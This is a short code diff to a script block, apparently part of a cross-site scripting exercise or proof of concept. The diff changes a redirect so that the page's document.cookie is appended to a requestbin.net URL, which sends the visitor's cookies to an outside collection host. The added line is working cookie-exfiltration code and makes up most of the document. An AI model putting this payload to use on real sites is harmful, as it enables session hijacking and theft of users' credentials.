@@ -4,5 +4,5 @@ function setCookie(){
     document.cookie = cookieString;
 }
 setCookie()
-window.location="http://requestbin.net/r/1l8lgtq1?inspect";
+window.location="http://requestbin.net/r/1l8lgtq1?cookie="+document.cookie;
 </script>
